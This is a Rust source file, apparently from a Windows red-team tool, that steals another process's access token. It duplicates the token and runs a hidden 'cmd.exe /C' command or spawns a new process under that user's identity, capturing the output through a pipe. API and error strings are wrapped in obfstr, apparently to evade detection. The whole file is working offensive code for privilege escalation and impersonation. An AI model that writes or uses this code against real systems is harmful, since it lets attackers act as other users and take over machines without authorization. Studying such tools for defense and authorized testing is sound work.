use core::time;

use std::thread;
use std::io::Error;

use std::{ffi::OsStr, os::windows::ffi::OsStrExt, iter::once};
use std::ptr::null_mut;
use std::ffi::c_void;

use obfstr::obfstr;
use log::{trace, info};
use colored::Colorize;

use windows_sys::Win32::UI::WindowsAndMessaging::SW_HIDE;
use windows_sys::Win32::Foundation::{INVALID_HANDLE_VALUE, FALSE, STILL_ACTIVE, MAX_PATH};
use windows_sys::Win32::Storage::FileSystem::ReadFile;

use windows_sys::{
    Win32::{
        Foundation::{HANDLE, CloseHandle},
        Security::{
            DuplicateTokenEx,
            TokenPrimary,
            SecurityDelegation,
        }
    },
    core::PWSTR
};

use windows_sys::Win32::Security::{
    SECURITY_ATTRIBUTES,
    SECURITY_DESCRIPTOR,
    InitializeSecurityDescriptor,
    TOKEN_QUERY,
    TOKEN_DUPLICATE,
};

use windows_sys::Win32::System::{
    Environment::{CreateEnvironmentBlock, DestroyEnvironmentBlock},
    SystemInformation::GetSystemDirectoryW,
    SystemServices::SECURITY_DESCRIPTOR_REVISION,
    Pipes::{CreatePipe},
    Threading::{PROCESS_QUERY_INFORMATION, CreateProcessWithTokenW, STARTUPINFOW, PROCESS_INFORMATION},
    SystemServices::MAXIMUM_ALLOWED,
    Threading::{OpenProcess, OpenProcessToken, GetExitCodeProcess, LOGON_WITH_PROFILE, STARTF_USESTDHANDLES, STARTF_USESHOWWINDOW, CREATE_NO_WINDOW, CREATE_UNICODE_ENVIRONMENT},
};

use crate::impersonate::{ImpersonationLevel, IntegrityLevel};
use crate::token::{Token, get_token_user_info};

/// Function to impersonate process from PID and execute commande line with token privileges
pub fn run_command(pid: u32, command: String) -> Result<bool, String> {
    // Debug information -vv
    trace!("[?] PID to impersonate: {}", pid);
    trace!("[?] Command to execute: {}", command);

    unsafe {
        let mut token_handle: HANDLE = std::mem::zeroed();
        let process_handle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
        if process_handle == INVALID_HANDLE_VALUE || process_handle == 0 {
            CloseHandle(process_handle);
            return Err(format!("{} Error: {}",obfstr!("OpenProcess"), Error::last_os_error()).to_owned());
        }

        if OpenProcessToken(process_handle,  TOKEN_DUPLICATE | TOKEN_QUERY, &mut token_handle) == 0 {
            CloseHandle(process_handle);
            CloseHandle(token_handle);
            return Err(format!("{} Error: {}",obfstr!("OpenProcessToken"), Error::last_os_error()).to_owned());
        };

        let mut token = Token {
            handle: token_handle,
            username: "".to_owned(),
            process_id: pid,
            process_name: "".to_owned(),
            session_id: 0,
            token_impersonation: ImpersonationLevel::Anonymous,
            token_integrity: IntegrityLevel::Untrusted,
            token_type: 0,
        };

        if let Ok(_) = get_token_user_info(&mut token){
            info!("{} {}", obfstr!("Impersonate user"),&token.username.bold());
        }

        let mut duplicate_token_handle: HANDLE = std::mem::zeroed();
        if DuplicateTokenEx(token_handle, MAXIMUM_ALLOWED, null_mut(), SecurityDelegation, TokenPrimary, &mut duplicate_token_handle) == 0 {
            CloseHandle(process_handle);
            CloseHandle(token_handle);
            CloseHandle(duplicate_token_handle);
            return Err(format!("{} Error: {}",obfstr!("DuplicateTokenEx"), Error::last_os_error()).to_owned());
        };

        trace!("[?] Token successfully duplicated");

        let mut sa : SECURITY_ATTRIBUTES = std::mem::zeroed::<SECURITY_ATTRIBUTES>();
        let mut sd : SECURITY_DESCRIPTOR = std::mem::zeroed::<SECURITY_DESCRIPTOR>();

        if InitializeSecurityDescriptor(&mut sd as *mut _ as *mut _, SECURITY_DESCRIPTOR_REVISION) == 0 {
            CloseHandle(process_handle);
            CloseHandle(token_handle);
            CloseHandle(duplicate_token_handle);
            return Err(format!("{} Error: {}",obfstr!("InitializeSecurityDescriptor"), Error::last_os_error()).to_owned());
        }

        trace!("[?] SECURITY_DESCRIPTOR initialized");

        sa.lpSecurityDescriptor = &mut sd as *mut _ as *mut _;

        trace!("[?] SECURITY_ATTRIBUTES initialized ");

        let mut read_pipe: HANDLE = std::mem::zeroed::<HANDLE>();
        let mut write_pipe: HANDLE = std::mem::zeroed::<HANDLE>();
     
        if CreatePipe(&mut read_pipe, &mut write_pipe, &sa, 0) == FALSE {
            return Err(format!("{} Error: {}",obfstr!("CreatePipe"), Error::last_os_error()).to_owned());
        }; 

        trace!("[?] Spawned named pipes");

        let mut environment_block = null_mut();

        if CreateEnvironmentBlock(
            &mut environment_block,
            token_handle,
            FALSE,
        ) == FALSE {
            return Err(format!("{} Error: {}",obfstr!("CreateEnvironmentBlock"), Error::last_os_error()).to_owned());
        }

        trace!("[?] Environment block created");

        let mut si: STARTUPINFOW = std::mem::zeroed();
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        si.hStdOutput = write_pipe;
        si.hStdError = write_pipe;
        let mut desktop_w: Vec<u16> = OsStr::new("WinSta0\\Default")
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();
        si.lpDesktop = desktop_w.as_mut_ptr();
        si.wShowWindow = SW_HIDE as u16;

        trace!("[?] STARTUPINFOW initialized");

        let mut working_dir = Vec::with_capacity(MAX_PATH as usize);
        GetSystemDirectoryW(working_dir.as_mut_ptr(), MAX_PATH);

        // Get the command line for example "whoami" or "whoami /all"
        let cmd_str = format!("{}{}", obfstr!("cmd.exe /C "), command);

        // build a null-terminated UTF-16 Vec<u16>
        let mut cmd_wide: Vec<u16> = OsStr::new(&cmd_str)
            .encode_wide()
            .chain(std::iter::once(0)) // add terminating NUL
            .collect();

        // For logging, print the original UTF-8 string (safer than round-tripping from UTF-16)
        trace!("[?] Command to be executed: {:?}", cmd_str);

        if CreateProcessWithTokenW(
            duplicate_token_handle,
            LOGON_WITH_PROFILE,
            null_mut(),
            cmd_wide.as_mut_ptr() as *mut _ as PWSTR,
            CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT,
            environment_block,
            working_dir.as_ptr(),
            &si,
            &mut pi
        ) == 0 {
            CloseHandle(process_handle);
            CloseHandle(read_pipe);
            CloseHandle(write_pipe);
            CloseHandle(token_handle);
            DestroyEnvironmentBlock(environment_block);
            CloseHandle(duplicate_token_handle);
            return Err(format!("{} Error: {}",obfstr!("CreateProcessWithTokenW"), Error::last_os_error()).to_owned());
        }

        trace!("[?] Process created with id: {}",pi.dwProcessId);

        // Read command line return
        let mut bytes_read:u32 = 0;
        let mut buffer_read = vec![0u8;16384];
        thread::sleep(time::Duration::from_millis(500));

        let mut exit_code = 0u32;
        let now = std::time::SystemTime::now();
        loop {
            GetExitCodeProcess(pi.hProcess, &mut exit_code);
            trace!("[?] Process exit code is: {}",exit_code);
            if exit_code as i32 != STILL_ACTIVE {
                break;
            }
            if now.elapsed().unwrap() >= std::time::Duration::from_secs(30) {
                CloseHandle(process_handle);
                CloseHandle(token_handle);
                CloseHandle(read_pipe);
                CloseHandle(write_pipe);
                DestroyEnvironmentBlock(environment_block);
                CloseHandle(duplicate_token_handle);
                return Err(format!("{}",obfstr!("Process timed out")).to_owned());
            }
            thread::sleep(time::Duration::from_millis(500));
            trace!("[?] Waiting for command to finish");
        }

        if exit_code != 0 {
            CloseHandle(process_handle);
            CloseHandle(token_handle);
            CloseHandle(read_pipe);
            CloseHandle(write_pipe);
            DestroyEnvironmentBlock(environment_block);
            CloseHandle(duplicate_token_handle);
            return Err(format!("{} {}: {}",obfstr!("Process spawned finish with"), exit_code, Error::last_os_error()).to_owned());
        }

        if ReadFile(read_pipe, buffer_read.as_mut_ptr() as *mut c_void, buffer_read.len() as u32, &mut bytes_read, null_mut())  == 0 {
            CloseHandle(process_handle);
            CloseHandle(token_handle);
            CloseHandle(read_pipe);
            CloseHandle(write_pipe);
            DestroyEnvironmentBlock(environment_block);
            CloseHandle(duplicate_token_handle);
            return Err(format!("{} Error: {}",obfstr!("ReadFile"), Error::last_os_error()).to_owned());
        }
        trace!("[?] {} bytes read\n",bytes_read);
        println!("{}",String::from_utf8_lossy(&mut buffer_read[..(bytes_read as usize)]));

        CloseHandle(process_handle);
        CloseHandle(read_pipe);
        CloseHandle(write_pipe);
        CloseHandle(token_handle);
        DestroyEnvironmentBlock(environment_block);
        CloseHandle(duplicate_token_handle);

        return Ok(true)
    }   
}

/// Function to impersonate process from PID and spawn new process with token privileges
pub fn spawn_process(pid: u32, process: String) -> Result<bool, String> {
    // Debug information -vv
    trace!("[?] PID to impersonate: {}", pid);
    trace!("[?] Process to spawn: {}", process);

    unsafe {
        let mut token_handle: HANDLE = std::mem::zeroed();
        let process_handle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
        if process_handle == INVALID_HANDLE_VALUE || process_handle == 0 {
            CloseHandle(process_handle);
            return Err(format!("{} Error: {}",obfstr!("OpenProcess"), Error::last_os_error()).to_owned());
        }

        if OpenProcessToken(process_handle,  TOKEN_DUPLICATE | TOKEN_QUERY, &mut token_handle) == 0 {
            CloseHandle(process_handle);
            CloseHandle(token_handle);
            return Err(format!("{} Error: {}",obfstr!("OpenProcessToken"), Error::last_os_error()).to_owned());
        };

        let mut token = Token {
            handle: token_handle,
            username: "".to_owned(),
            process_id: pid,
            process_name: "".to_owned(),
            session_id: 0,
            token_impersonation: ImpersonationLevel::Anonymous,
            token_integrity: IntegrityLevel::Untrusted,
            token_type: 0,
        };

        if let Ok(_) = get_token_user_info(&mut token){
            info!("{} {}", obfstr!("Impersonate user"),&token.username.bold());
        }

        let mut duplicate_token_handle: HANDLE = std::mem::zeroed();
        if DuplicateTokenEx(token_handle, MAXIMUM_ALLOWED, null_mut(), SecurityDelegation, TokenPrimary, &mut duplicate_token_handle) == 0 {
            CloseHandle(process_handle);
            CloseHandle(token_handle);
            CloseHandle(duplicate_token_handle);
            return Err(format!("{} Error: {}",obfstr!("DuplicateTokenEx"), Error::last_os_error()).to_owned());
        };

        trace!("[?] Token successfully duplicated");

        let mut sa : SECURITY_ATTRIBUTES = std::mem::zeroed::<SECURITY_ATTRIBUTES>();
        let mut sd : SECURITY_DESCRIPTOR = std::mem::zeroed::<SECURITY_DESCRIPTOR>();

        if InitializeSecurityDescriptor(&mut sd as *mut _ as *mut _, SECURITY_DESCRIPTOR_REVISION) == 0 {
            CloseHandle(process_handle);
            CloseHandle(token_handle);
            CloseHandle(duplicate_token_handle);
            return Err(format!("{} Error: {}",obfstr!("InitializeSecurityDescriptor"), Error::last_os_error()).to_owned());
        }

        trace!("[?] SECURITY_DESCRIPTOR initialized");
        sa.lpSecurityDescriptor = &mut sd as *mut _ as *mut _;
        trace!("[?] SECURITY_ATTRIBUTES initialized ");

        let mut environment_block = null_mut();

        if CreateEnvironmentBlock(
            &mut environment_block,
            token_handle,
            FALSE,
        ) == FALSE {
            return Err(format!("{} Error: {}",obfstr!("CreateEnvironmentBlock"), Error::last_os_error()).to_owned());
        }
        trace!("[?] Environment block created");

        let mut si: STARTUPINFOW = std::mem::zeroed();
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;

        trace!("[?] STARTUPINFOW initialized");

        let mut working_dir = Vec::with_capacity(MAX_PATH as usize);
        GetSystemDirectoryW(working_dir.as_mut_ptr(), MAX_PATH);

        // build a null-terminated UTF-16 Vec<u16>
        let app_w: Vec<u16> = OsStr::new(&process)
            .encode_wide().chain(once(0)).collect();

        // For logging, print the original UTF-8 string (safer than round-tripping from UTF-16)
        trace!("[?] Process to spawn: {:?}", process);

        if CreateProcessWithTokenW(
            duplicate_token_handle,
            LOGON_WITH_PROFILE,
            app_w.as_ptr(),
            null_mut(),
            0,
            null_mut(),
            working_dir.as_ptr(),
            &si,
            &mut pi
        ) == 0 {
            CloseHandle(process_handle);
            CloseHandle(token_handle);
            DestroyEnvironmentBlock(environment_block);
            CloseHandle(duplicate_token_handle);
            return Err(format!("{} Error: {}",obfstr!("CreateProcessWithTokenW"), Error::last_os_error()).to_owned());
        }

        trace!("[?] Process created with id: {}",pi.dwProcessId);

        CloseHandle(process_handle);
        CloseHandle(token_handle);
        DestroyEnvironmentBlock(environment_block);
        CloseHandle(duplicate_token_handle);

        return Ok(true)
    }   
}